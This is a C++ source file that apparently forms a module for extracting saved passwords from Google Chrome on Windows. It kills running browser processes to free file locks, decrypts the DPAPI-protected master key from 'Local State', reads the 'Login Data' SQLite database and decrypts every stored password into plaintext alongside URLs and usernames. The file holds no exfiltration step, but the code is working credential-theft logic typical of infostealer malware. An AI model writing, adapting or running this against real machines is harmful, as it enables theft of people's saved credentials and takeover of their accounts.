#include "chrome.hxx"

#include "crypt.hxx"
#include "utils.hxx"
#include <fstream>
#include <vector>
#include <windows.h>
#include <TlHelp32.h>
#include <sqlite3.h>
#include <wil/resource.h>
#include <nlohmann/json.hpp>

chrome::chrome(std::string proc_name, std::filesystem::path key_path, std::filesystem::path logins_path)
    : m_proc_name(proc_name)
    , m_key_path(key_path)
    , m_logins_path(logins_path) { }

std::unique_ptr<chrome> chrome::construct(std::string proc_name, std::filesystem::path path) {
    namespace fs = std::filesystem;
    fs::path key = path / "Local State";
    // TODO: read all profiles:
    fs::path logins = path / "Default" / "Login Data";

    if (fs::exists(key) && fs::exists(logins)) {
        return std::unique_ptr<chrome>(new chrome(proc_name, key, logins));
    } else {
        return nullptr;
    }
}

std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
    if (BCryptOpenAlgorithmProvider(&m_aes_alg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
        return std::unexpected(browser_error::bcrypt_error);
    }

    BCryptSetProperty(m_aes_alg.get(), BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    // kill processes to free file locks
    kill();

    std::ifstream key_file(m_key_path);

    // encrypted_key is encrypted with the Windows Data Protection API (DPAPI),
    // then base64 encoded. this is the AES key with which the password_value
    // database column fields are encrypted.

    std::vector<uint8_t> key_data;
    using json = nlohmann::json;
    try {
        json j = json::parse(key_file);
        key_data = b64_decode(j["os_crypt"]["encrypted_key"]);
    } catch (json::exception &) {
        return std::unexpected(browser_error::json_parse_error);
    }

    // key_data[0,4] is the string "DPAPI", which must be removed
    key_data.erase(key_data.begin(), key_data.begin() + 5);
    key_data = dpapi_decrypt(key_data);
    wil::unique_bcrypt_key key = import_key_data(m_aes_alg, key_data);

    using unique_sqlite3 = wil::unique_any<sqlite3 *, decltype(&sqlite3_close), sqlite3_close>;
    using unique_sqlite3_stmt = wil::unique_any<sqlite3_stmt *, decltype(&sqlite3_finalize), sqlite3_finalize>;

    unique_sqlite3 db;
    if (sqlite3_open(m_logins_path.string().c_str(), &db) != SQLITE_OK) {
        return std::unexpected(browser_error::sqlite_error);
    }

    sqlite3_busy_timeout(db.get(), 1000);

    unique_sqlite3_stmt stmt;
    if (sqlite3_prepare_v2(db.get(),
                           "SELECT origin_url, date_created, date_last_used, date_password_modified, username_value, password_value FROM logins",
                           -1, &stmt, NULL) != SQLITE_OK) {
        return std::unexpected(browser_error::sqlite_error);
    }

    std::vector<login> logins;

    int step_ret = 0;
    while ((step_ret = sqlite3_step(stmt.get())) == SQLITE_ROW) {
        // TODO: tidy
        // clang-format off
        const std::string    db_origin_url             = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 0));
        const sqlite3_int64  db_date_created           = sqlite3_column_int64(stmt.get(), 1);
        const sqlite3_int64  db_date_last_used         = sqlite3_column_int64(stmt.get(), 2);
        const sqlite3_int64  db_date_password_modified = sqlite3_column_int64(stmt.get(), 3);
        const std::string    db_username_value         = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 4));
        const uint8_t       *db_password_value         = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt.get(), 5));
        const size_t         db_password_value_size    = sqlite3_column_bytes(stmt.get(), 5);
        // clang-format on

        std::vector<uint8_t> db_password(db_password_value, db_password_value + db_password_value_size);

        // db_password[0,2] is the string "v10" (kEncryptionVersionPrefix), which is skipped
        std::vector<uint8_t> nonce(db_password.begin() + 3, db_password.begin() + 15),
            ciphertext(db_password.begin() + 15, db_password.end() - 16),
            tag(db_password.end() - 16, db_password.end());

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
        BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
        auth_info.pbNonce = nonce.data();
        auth_info.cbNonce = (ULONG)nonce.size();
        auth_info.pbTag = tag.data();
        auth_info.cbTag = (ULONG)tag.size();

        std::string password_plaintext(ciphertext.size(), '\0');
        ULONG bytes_copied;
        NTSTATUS status = BCryptDecrypt(
            key.get(),
            ciphertext.data(), (ULONG)ciphertext.size(),
            &auth_info,
            NULL, 0,
            reinterpret_cast<PUCHAR>(password_plaintext.data()), (ULONG)password_plaintext.size(),
            &bytes_copied,
            0);
        if (!BCRYPT_SUCCESS(status)) {
            continue;
        }

        using namespace std::chrono;

        // time is stored by chrome as microseconds since the windows FILETIME epoch
        // https://source.chromium.org/chromium/chromium/src/+/main:base/time/time.h;l=505;drc=721e6d70189ce1350f8ff733a02c98b9bc8e8251
        // https://docs.microsoft.com/en-us/windows/win32/sysinfo/file-times

        // difference between UNIX epoch (1970-01-01 00:00:00 UTC) and windows FILETIME
        // epoch (1601-01-01 00:00:00 UTC)
        auto epoch_offset = seconds{11644473600LL};

        system_clock::time_point date_created{microseconds{db_date_created} - epoch_offset};
        system_clock::time_point date_password_modified{microseconds{db_date_password_modified} - epoch_offset};

        // db_date_last_used can be 0 if never used, so check before converting to unix time
        system_clock::time_point date_last_used{};
        if (db_date_last_used != 0) {
            date_last_used = system_clock::time_point{microseconds{db_date_last_used} - epoch_offset};
        }

        login l {
            .url = db_origin_url,
            .username = db_username_value,
            .password = password_plaintext,
            .date_created = date_created,
            .date_last_used = date_last_used,
            .date_password_modified = date_password_modified,
        };
        logins.emplace_back(l);
    }
    if (step_ret != SQLITE_DONE) {
        return std::unexpected(browser_error::sqlite_error);
    }

    return logins;
}

void chrome::kill(void) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));
    if (!Process32FirstW(snapshot.get(), &entry)) {
        return;
    }
    do {
        if (narrow(entry.szExeFile) == m_proc_name) {
            wil::unique_handle process(
                OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID));
            if (process) {
                TerminateProcess(process.get(), 0);
            }
        }
    } while (Process32NextW(snapshot.get(), &entry));
}
